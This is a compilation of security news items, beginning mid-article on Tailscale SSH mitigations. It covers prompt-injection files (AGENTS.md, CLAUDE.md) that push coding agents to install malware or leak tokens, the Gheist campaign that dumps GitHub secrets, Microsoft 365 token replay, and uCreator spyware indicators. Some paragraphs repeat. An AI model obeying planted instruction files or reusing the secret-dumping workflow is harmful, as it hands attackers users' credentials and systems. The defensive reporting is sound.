The report is the latest in a run of problems in the same part of Tailscale. Earlier in 2026, the company fixed several Tailscale SSH and server socket-handling flaws, including one where SSH Unix socket forwarding could reach a privileged socket, in version 1.98.9.

What to Do Now

Because there is no patch, the available steps are changes to how Tailscale SSH and related features are set up. The report and Tailscale's own advice overlap on most of them.

  • Review your Tailscale SSH access rules. Write them as single source-to-destination pairs that name one device and one target, and remove broad rules that grant access by identity or tag. The report calls per-pair rules the one control that stopped the spread in testing.
  • Turn off SSH port forwarding where you can. On Tailscale's hosted service this is a per-rule setting. On headscale version 0.29.5 it cannot be turned off, so treat every SSH grant there as giving root on the target.

  • Remove any tailscale serve forward that points at a Unix socket.

item.title: Malicious File in Downloads Folder Tries to Trick AI Coding Agent Into Installing Malware (2026)
item.description:
A malicious instruction file sitting in a developer's Downloads folder tried to make their AI coding agent install a known-malicious npm package, security firm Forever Security said in a report published last week.

The company caught the attempt on a real customer's machine and stopped the agent before any code ran. It could not determine how the file got into the folder.

The file was  AGENTS.md, a plain-text instructions file that a coding agent, such as OpenAI's Codex, reads when it starts in a folder and follows as directions.

It was dressed up as ordinary engineering notes. One section told the agent to add a server to its own configuration and install a package called function-color from npm.

That package is part of a malware campaign that other researchers have documented separately: function-color pulls in a downloader called function-flag, which fetches and runs a Windows payload. Researchers at CloudSEK and Checkmarx, who analyzed the campaign, named it MALFEX.

Two things, each harmless on its own, make this work, Forever said. An agent is built to trust and obey the instructions file in the folder it opens. And a web page can save a file to the Downloads folder on its own, without a click or a permission prompt, choosing the name and contents. Put together, a web page can drop a file the agent will treat as orders into a folder the agent trusts.

Researchers did not establish that this is how the file was caught. To test whether the full path was possible, it built its own proof-of-concept page: visit it, and an AGENTS.md downloads silently into Downloads. Whether a real attacker used that route against the customer is not known.

The firm then reproduced the attack on two coding agents to show that it was not specific to a single product. Against Codex, it ran the real attacker file inside an isolated virtual machine. The file, framed as routine project setup, told Codex to register a server in ~/.codex/config.toml and run a command that installed the package.

Because that config file applies to every Codex session on the machine, the change would load the attacker's server in any folder afterward, not just Downloads. Codex ran the malware in more than 90% of attempts, Forever said.

Against Claude Code, the working attack looked different and succeeded less often. A planted CLAUDE.md, framed as internal gateway setup, tried to make Claude write an ANTHROPIC_BASE_URL into a project settings file, pointing its API traffic at a server Forever controlled. That one change leaks the session's login token, which is account takeover on its own, and lets the server reply as if it were the model and hand back commands the agent runs.

Claude needs a person to approve a write like that and often refuses one that looks wrong; the long engineering-doc framing got the write approved about half the time, researchers said.

There is nothing for OpenAI or Anthropic to patch, in Forever's view, because an agent following the instructions file in its folder is doing what it was built to do. The company compared it to a browser rendering a phishing page: the browser worked as designed, and the attack lies in the page. "There is nothing here for OpenAI or Anthropic to patch," Forever said.

What to do

Forever's advice is practical and needs no product:

  • Do not start Codex, Claude Code, or any agent in ~/Downloads. It is the one folder the web can write to on its own.
  • Look for instructions files you did not write. A stray AGENTS.md or CLAUDE.md, in Downloads or in a repository you just cloned, is the whole attack. Read it before you let an agent near it.
  • Check the agent's own config. In ~/.codex/config.toml, watch for a server block or a changed base URL you did not add. In a project's .claude/settings.json, watch for an ANTHROPIC_BASE_URL or other API endpoint you did not set.
  • Leave approval prompts and sandboxes on, and be wary of anything that tells the agent to switch them off.
  • If you find a planted file, assume the login token leaked and rotate it. A stolen token is a live session, not just one caught request.

In its own telemetry, Forever said that about half of its customers run a coding agent in their Downloads folder, and roughly a quarter of agent sessions open a browser.

Those are the conditions the attack needs: an agent starts where the web can write, and, in many cases, an agent does the browsing itself, so no person is watching when a file arrives.

item.title: Gheist Uses Stolen GitHub Tokens to Steal Private Repository Secrets via Actions Logs (2026)
item.description:
An automated campaign is using stolen GitHub tokens to plant workflows that print a repository's secrets into its GitHub Actions logs, which the attackers then download before deleting the runs. The attacks have succeeded in private repositories and GitHub Enterprise environments, according to an analysis by cloud security company Wiz.

A GitHub safeguard that pauses suspicious workflow runs stopped every public-repository run Wiz checked, but it does not cover private repositories or GitHub Enterprise Server.

Each workflow sits on a new branch named ci-sync- followed by six random characters. Deleting a branch, or the run it started, does not undo the exposure. Every secret the repository could read should be rotated, and the token that pushed the branch revoked.

Wiz has tracked the campaign since September 15 and calls it Gheist, after the user agent gheist that the attackers' tool sends with GitHub API requests.

Wiz has recovered more than 13,500 planted branches from more than 850 compromised accounts, from personal projects to the private repositories of enterprise organizations. Wiz's analysis does not say how many organizations had secrets exposed.

In private repositories and on GitHub Enterprise Server, GitHub audit logs show runs on the planted branches finishing and then being deleted by the gheist user agent. AWS CloudTrail logs show the organization's own workflows also running on those branches and assuming AWS roles, a sign that GitHub Actions ran there without approval.

In enterprise organizations, the tool cycled through tokens from several users and automation accounts within minutes and cloned private repositories before planting the workflow. Hours later, cloud credentials from the same organization were used to enumerate AWS Secrets Manager. Wiz's analysis does not say where those credentials came from or who used them.

As of October 24, the campaign was still running and changing. About two-thirds of the accounts involved were no longer available on GitHub. Wiz reported the activity to GitHub and says their disappearance likely reflects a response.

Anyone with write access to a GitHub repository can read every secret configured in it, according to GitHub's documentation. A stolen token with that access is enough.

For each repository a token can reach, the tool creates a ci-sync- branch and commits one file, .github/workflows/sync-check.yml, with the message ci: sync config. The commit is unsigned and includes the token owner's name; pushing it starts the workflow.

The workflow prints the job's environment and every secret the job can read, encoded in base32. GitHub masks secrets in logs, but its documentation says this is not guaranteed once a value has been encoded or otherwise changed. Wiz says the base32 text no longer matches the original secret, so it prints in full.

The workflow sets an empty permissions block. That limits the job's GITHUB_TOKEN, which the attackers do not need, and does not stop the job from reading secrets.

One version of the tool also runs a job for each deployment environment in the repository, so secrets limited to those environments print too. These are often production credentials, according to Wiz.

The tool then downloads the log through GitHub's API and deletes the run seconds later. Because the secrets leave through GitHub itself, there is no attacker server or outbound connection to block.

Since July 28, GitHub has held workflow runs it identifies as potentially malicious until a collaborator with write access approves them. GitHub says the hold "currently applies to public repositories on github.com only" and that GitHub Enterprise Server does not have it at this time.

Every public Gheist run Wiz checked, across all versions of the tool, was still waiting for approval, so its payload never ran.

The hold only catches runs that GitHub flags. A new variant of GhostAction, a separate campaign, ran in public repositories until GitHub began blocking it on October 9, according to research from security company GitGuardian. Wiz says Gheist is distinct from GhostAction, which uses different workflow files.

Around October 19, one version of the tool began pushing a second job meant for self-hosted runners, the machines organizations run themselves to process GitHub Actions jobs. It appears to target only repositories that have such a runner registered.

The job is written to search the runner machine for credentials, including 31 types of tokens: private keys, process environments, AWS instance role credentials, runner credential files, and the Kubernetes service account token. Wiz describes the job as buggy, and its analysis reports no successful run.

The sources Wiz could trace for the stolen tokens include infostealer logs and tokens exposed in earlier supply-chain attacks, such as the March compromise of the Trivy vulnerability scanner.

Other attackers also use the same accounts. On October 6, 391 accounts, many of them also used by Gheist, renamed about 1,461 repositories to appear to be cracked software and spread malware. The renaming wiped 610 of the planted branches.

Some victims also appear to be infected with PolinRider, malware that researchers have linked to North Korea. On October 19 and 20, three of them re-pushed their Gheist commits with a loader added to a vite.config.js file.

Megalodon, a campaign that pushed secret-stealing workflows into thousands of GitHub repositories in May, had also hit 57 of the accounts.

How to Check Your Repositories

Wiz recommends these checks:

  • Look for branches named ci-sync- followed by six characters, where the only change is a new .github/workflows/sync-check.yml file with the commit message ci: sync config.
  • In GitHub audit logs, look for workflow runs on ci-sync-* branches that were deleted within a minute of finishing, and for any activity from the user agent gheist.
  • If your workflows sign in to a cloud provider with OIDC, check cloud audit logs for role assumptions or token exchanges whose subject includes a ci-sync- branch. This works even if you do not collect GitHub logs.
  • On self-hosted runners, look for the files .gdmp_pat, .gdmp_patg and .gdmp_sweep, and the string gdmp-pivot in job logs.

OIDC lets workflows sign in with short-lived tokens instead of stored cloud keys. By default, a token's subject includes the branch name only when the job does not use a deployment environment, according to GitHub's OIDC documentation.

The published indicators are:

  • User agent: gheist
  • Branch: ^ci-sync-[0-9a-z]{6}$
  • Commit message: ci: sync config, adding only .github/workflows/sync-check.yml
  • String: toJSON(secrets) }}' | base32 -w 120
  • String: ===== gdmp-pivot:
  • File: .gdmp_pat
  • File: .gdmp_patg
  • File: .gdmp_sweep
  • Git blob SHA (plain workflow): f3da2b8b357dcda02fd455d314be2a95007516a6
  • Git blob SHA (timeout version): d09535857a741bbb976bdc084a9a021713133291
  • Git blob SHA (separator version): 1dc5af9cce950aad1eb1546ecce8565b117540c4
  • Git blob SHA (self-hosted job version): c665b778b2d822453293003e7ca0bbb2cb08e39d

Versions of the workflow that list a repository's deployment environments vary by repository, so they have no fixed hash.

What to Do If You Find a ci-sync Branch

Wiz advises these steps for an affected repository:

  • Rotate every repository, organization, and environment secret the repository could use.
  • Revoke the tokens that pushed the commits, and check their owners' devices for infostealers.
  • If a ci-sync branch ran on a self-hosted runner, treat the machine and its cloud instance role as compromised.
  • Do not approve held sync-check runs, and do not run code from ci-sync branches.

To make a stolen token less useful, Wiz also recommends these steps:

  • Require reviewers on environments that hold production secrets.
  • Limit OIDC trust policies to protected branches or environments.
  • Use GitHub Apps or short-lived fine-grained tokens instead of personal access tokens.
  • Run self-hosted runners as short-lived machines without Docker socket access or open access to cloud metadata.

A job cannot read an environment's secrets until a required reviewer approves it, according to GitHub's documentation.

item.title: Microsoft 365 Token-Replay Attacks Compromise 97 Accounts at 79 Organizations (2026)
item.description:
Cybersecurity researchers have disclosed a Microsoft 365 campaign that has been observed leveraging an adversary-in-the-middle (AitM) relay to capture sign-in sessions and then replay the stolen tokens to break into email accounts at 79 organizations.

Huntress, which observed the activity between July 14 and September 22, 2026, said it detected 497 successful Microsoft 365 sign-in events across the victim organizations from over 200,000 login attempts, with the attackers ultimately compromising 97 accounts and registering 48 rogue Entra devices.

"Rather than guessing passwords, the attacker replayed sign-in tokens stolen from victims, and we've traced more than 200,000 failed login attempts from the campaign window back to the 193.26.115[.]0/24 IP range," Huntress researchers Andrea Hatcher, Susannah Matt, Matt Poto, and Andrew Schwartz said.

The attack has been found to employ an AitM login page, which sits between the victims and legitimate Microsoft infrastructure to capture the entered credentials and MFA codes and relay the information to the real login page.

The end goal is to collect the access token issued by Microsoft following the sign-in process so that it doesn't have to bypass MFA a second time. The "proof of login" token is subsequently replayed by the attacker from their own devices within minutes to conduct automated sign-in attempts against Microsoft 365 services.

The approach has been codenamed token spraying, as it involves the attacker replaying many stolen tokens at scale across several organizations in a manner that's analogous to password spraying.

Upon gaining successful access, the attackers moved to add their own authenticator app as a form of persistence to complete MFA challenges for new sign-ins and overcome scenarios where the stolen session token expires or gets revoked by the victim.

In no less than 19 organizations, the victim's existing MFA methods were removed and a new method registered within three hours of the first sign-in. In one case observed on July 21, 2026, the threat actors activated a new authenticator app named "iPhone 13" less than 51 minutes after the session was hijacked.

"Rogue devices served the same purpose," the researchers said. "The threat actor registered at least 48 fake computers in victim organizations' Microsoft directories. A registered device can give the attacker a more durable way to request tokens than the stolen session alone, and it stays in the directory until someone deletes it."

Furthermore, the attackers have also been spotted setting up hidden email rules in victims' inboxes with names such as ".," "sss," "ss," "iT," ",.," "........," "s," and "d" to delete incoming mail with certain keywords referencing payroll, deposit, and bonus, or move them to obscure folders like RSS Feeds and Conversation History.

In one compromised mailbox, the email rule marked all incoming messages as read and deleted them. The mailbox was then used to send outbound spam to hundreds of external recipients before Microsoft Entra ID Protection rated the account high risk.

Huntress said the tokens originate from multiple sources, including AitM relays behind fake sign-in pages, device-code phishing, and social engineering during a legitimate login process.

The campaign was first observed from a Romanian IP address "193.26.115[.]221," which, according to VirusTotal, is used by a remote access trojan called AsyncRAT. The IP address is associated with a German hosting provider named 1337 Services GmbH.

Data from GreyNoise currently lists 29 IP addresses matching the hosting provider, out of which 10 have been flagged as malicious and five are marked suspicious. Notably, the entity is linked to StarkRDP and rdp[.]sh, which allows paying customers to rent virtual servers.

The domains tied to both StarkRDP and rdp[.]sh were taken down, alongside websites for Nulled, Cracked, and Sellix, as part of an international law enforcement operation dubbed Talent in January 2025. As of writing, the two platforms are operational, with the former now rebranded as exy[.]sh.

"StarkRDP has always been operating by the law and is not involved in any of these alleged crimes, and the legal process will confirm this," the StarkRDP Telegram account said in a post dated January 30, according to independent cybersecurity journalist Brian Krebs.

"The only things that were seized is [sic] the website server and our domain. Unfortunately, no one can tell who took it and with whom we can talk about it. Therefore, we will restart operation soon, under a different name, to close the chapter [of] 'StarkRDP.'"

Organizations who suspect a token replay compromise are recommended to revoke sessions and reset the password, audit Entra devices, review MFA methods, check for unexpected inbox rules or new enterprise applications, and restrict device-code workflow with Conditional Access policies.

"Conditional Access Policies (CAP) can help fill some of the security gaps that MFA can't, as long as they're appropriately implemented," Huntress researchers said. "Businesses setting up CAPs should require MFA (or block) for All Users, All Cloud Apps, and All Client App types, unconditionally."

Huntress said the tokens originate from multiple sources, including AitM relays behind fake sign-in pages, device-code phishing, and social engineering during a legitimate login process.

The campaign was first observed from a Romanian IP address "193.26.115[.]221," which, according to VirusTotal, is used by a remote access trojan called AsyncRAT. The IP address is associated with a German hosting provider named 1337 Services GmbH.

item.title: uCreator Android Spyware Can Steal Telegram 2FA Passwords and Clone WeChat Accounts (2026)
item.description:
A rentable Android spyware kit called uCreator takes over Telegram and WeChat accounts by hiding its code inside working copies of the two apps, researcher Ovi found. It only reaches people who install one of these tampered copies, spread outside the official app stores, or who run WeChat inside the kit makers' own container app.

The kit's Telegram part matches Baohuo, a backdoor that Doctor Web reported in October 2025. Doctor Web found Baohuo in tampered copies of Telegram X, an Android app from Telegram. At the time, the company estimated that more than 58,000 devices were infected.

The Hacker News compared the two reports. Doctor Web's technical description of Baohuo lists the same code namespace, com.ucreator.tgjar, the same command-and-control (C2) server, and matching command names as Ovi's analysis.

Ovi's analysis, published October 21, 2026, does not mention Doctor Web's findings, and Doctor Web did not name the kit. It is not clear whether the kit's makers or one of their customers ran the campaign Doctor Web tracked.

Who Is Exposed

The tampered apps spread through sideloading, where a person installs an app file directly instead of from an app store, and through social engineering, Ovi found. He could not confirm how every victim was infected.

A second route is the kit makers' own container app, called 洋葱盒子 ("Onion Box"), which runs other apps inside itself.

Some of the tampered Telegram X copies use the same package name as the real app on Google Play, so the name alone does not give them away.

Doctor Web found that Baohuo copies had been spreading since mid-2024 through in-app ads that led to fake app store sites. Those sites promoted Telegram X as a dating and video chat app.

The sites' banners were available only in Portuguese, for users in Brazil, and in Indonesian. Even so, Doctor Web's 2025 map of infected devices by country put India first, at 22.8%, ahead of Brazil at 20.5% and Indonesia at 9.6%.

Baohuo copies also turned up in the third-party stores APKPure, ApkSum and AndroidP. On APKPure, one was listed under the official developer's name, although its digital signature was different.

Ovi got access to one of the kit's command servers. It held data on victims apparently located in China and the United States, but not enough for a reliable count. He calls his report "an analysis of technical capability, not a measurement of victim impact."

The apparent targets, still unconfirmed, are users of mobile wallets and messaging apps in China and Southeast Asia, including WeCom, QQ, WhatsApp, LINE, Zalo, KakaoTalk, Viber, GCash and MoMo. He found code supporting about 20 apps, but has published code only for Telegram and WeChat.

The kit's hooking engine is the part that lets its code intercept an app's functions. Ovi checked it on a Pixel 10 Pro running Android 17. It could not find an internal Android function it relies on, because newer Android versions changed that function.

Another tool, Frida, could still hook apps the same way on that phone. Ovi therefore describes this as extra work for the kit's makers, not proof that Android 17 blocks the attack.

The newest sample, dated July 29, 2026, still carried the old engine. He recovered samples built for Android 16 but did not report testing that version. He has not tested phones from Chinese makers.

How It Takes Over a Telegram Account

Inside a tampered Telegram app, the kit's code starts with the app and runs with the app's own identity and permissions, Ovi found. That gives it the same access as the signed-in app.

Each tampered app also runs a local command server inside itself. The code for each target app is downloaded after installation, which makes the installer file harder to analyze on its own.

Attackers can send any database query to the app's message store and get chat history back.

Telegram's two-step verification (2FA) password is entered in the app, which uses it to generate a login proof on the phone. The kit hooks that step and copies the password in readable form before the app hashes it.

With the password, the code can reset the account's logged-in sessions, change the linked phone number, or delete the account. Other parts of the code are designed to lock out the owner while keeping the attacker's session alive.

The code can also hide the attacker's session from the device list that the tampered app shows the user.

Doctor Web's description of Baohuo covers the same device-hiding. The backdoor also sends the account's phone number, name and password to its server every three minutes.

Neither Ovi nor Doctor Web says whether a hidden session still appears on the user's other, untampered Telegram apps. Neither gives steps for securing an account taken over this way.

Ovi says the code shows what the kit can do, not that attackers have used every step from start to finish.

Earlier Android malware has also run legitimate apps with attacker code inside them. FjordPhantom did this to banking apps through virtualization in 2023, and so did the GodFather banking trojan in 2025.

Ovi argues the kit is different because it is sold as a product. Customers can steer it remotely against any app its makers write a module for.

The WeChat Part and the Leaked Back End

For WeChat, the kit can also use app virtualization, running the unchanged app inside its own container, Ovi found. A command copies out the account's login identity. The app's data is then zipped and uploaded, and a bundled login script is used to clone the account.

This part goes after the account itself, not its chat history.

Ovi and another researcher, Jurre, also found the back-end code behind the kit on a self-hosted GitLab server. It was the one part of the setup not limited to approved IP addresses.

The code shows a cloud console that merchants and resellers rent. Every command carries the customer's ID, so each customer aims its own share of the phone fleet at victims it picks.

Commands go to phones in the kit's phone farm, a set of phones the operation controls, and to victims' phones. There, the kit captures login authorizations, adds friends in bulk, collects contact and profile data, and backs up whole accounts.

A scheduler sets time windows, random daily limits, and per-account budgets, so the activity looks human and gets past the platforms' risk checks. The code calls this "account cultivation," in Ovi's translation.

About three dozen developers, all working on China time, appear in the code's history, and some were still adding changes in October 2026.

The leaked back end covers personal WeChat and WeCom accounts. Ovi says it did not appear to cover Telegram, and only one of several GitLab servers was exposed.

Who Is Behind It

Ovi ties parts of the operation to three companies in Hunan province, China. One is linked to the kit's brand website and a server certificate, another to a government website filing for a command server, and the third to the signature on the kit's Windows control program.

He says a shared owner is "plausible, but remains unproven."

The makers' own name for the product is YingGai, and the product line appears in records dating back to September 2021. The samples Ovi studied date from 2024 to July 2026.

Ovi assumes the kit is used for financially motivated crime, given its focus on wallets and one-time passcodes. Doctor Web described Baohuo as "a tool for boosting the number of subscribers in Telegram channels."

Indicators of Compromise

The kit leaves two traces on a phone that Ovi calls reliable. One is a code file, TgJarPine.dex, in the assets of some tampered Telegram copies. The other is the original app copy that LSPatch, an off-the-shelf patching tool, leaves at cache/lspatch/origin/*.apk.

Because that second trace comes from LSPatch itself, it can also appear in apps patched with the tool for other reasons.

When The Hacker News checked DNS records on October 23, 2026, several of the kit's server and download domains no longer resolved. The domain for its version-upload server still pointed to 121.37.194[.]194.

  • SHA-256: 0142749a159be3e41d28f910eebf28b577a282880bd0c2383bd7404189f4ff94 (com.uckj.tgx, loader)
  • SHA-256: dcec9640271a782553599197bcb85367971a5bb4aa84c3787d1e49a3f4f9420e (org.thunderdog.challegram, tampered Telegram X, November 2024)
  • SHA-256: 805834e6b8c12e180117a1816b48e387c33b53520f5a91cbf858441dc895e717 (org.telegram.messenger.web, tampered Telegram, July 2024)
  • SHA-256: a90e3ab2b5cf306439a378faf7107a89196116ad7ee4ad5791c2ba8839ba21c4 (org.thunderdog.challegram, tampered Telegram X)
  • SHA-256: f82ac2c525d1ed82e57b3f27ae689aeda46875a893ca4c42876b3166ba66bb20 (com.ucreator.va_vx, WeChat host)
  • SHA-256: 99c5be579d218acfd2c7e2662528e7ad32a1a605d8efd1da732c13931bc30c4c (com.ucreator.va_yjb_client, Onion Box)
  • SHA-256: 9c8b147f76312e651faabb1411a3270efca984dd8f33bd8ded3ea611c7c583a1 (uip.exe, Windows control program)
  • Domain: hpncallback.gold5play[.]com (command server, not resolving on October 23)
  • Domain: hpncallback.qianxunlbs[.]com (command server, not resolving on October 23)
  • Domain: telegram-apk.uzyzx[.]com (download host, not resolving on October 23)
  • Domain: hw.android.videoflow[.]cn (version uploads, pointing to 121.37.194[.]194 on October 23)
  • IP: 159.138.237[.]10:32115 (Redis server)
  • IP: 159.138.229[.]12:26379 (Redis server)
  • Domain: r-bp1jehsclgbuu48m7tpd.redis.rds.aliyuncs[.]com:65531 (Redis server, WeChat part)
  • IP: 43.225.141[.]209 (relay used by the Telegram part)
  • URL: kfpt.oss-cn-hangzhou.aliyuncs[.]com/android/app/YingGai/ (hook downloads)

Doctor Web has published its own indicators for Baohuo.
